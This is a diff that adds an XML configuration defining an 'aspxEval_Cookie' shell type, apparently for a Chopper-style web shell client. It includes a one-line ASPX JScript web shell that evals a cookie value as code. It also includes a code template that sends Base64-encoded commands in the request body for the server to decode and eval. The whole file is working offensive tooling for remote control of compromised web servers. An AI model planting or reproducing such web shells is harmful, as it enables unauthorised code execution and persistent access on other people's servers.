@@ -1,0 +1,24 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <basicSetting>
+    <name>aspxEval_Cookie</name>
+    <serviceExample><![CDATA[<%@ Page Language="Jscript"%><%eval(Server.UrlDecode(Request.Cookies["a"].Value),"unsafe");%>]]></serviceExample>
+    <mainCodeParam location="cookie" encrymode="None" >passwd</mainCodeParam>
+  </basicSetting>
+  <mainCodeSetting>
+	<funcCodeParam location="Body" encrymode="Base64" >funcCode</funcCodeParam>
+    <item><![CDATA[Response.Write("->|");
+var err:Exception;
+try
+{
+	var item=Request.Item["$funcCode$"];
+	eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(item)),"unsafe");
+}
+catch(err)
+{
+	Response.Write("ERROR://"+err.message);
+}
+Response.Write("|<-");
+Response.End();]]></item>
+  </mainCodeSetting>
+</customShellType>
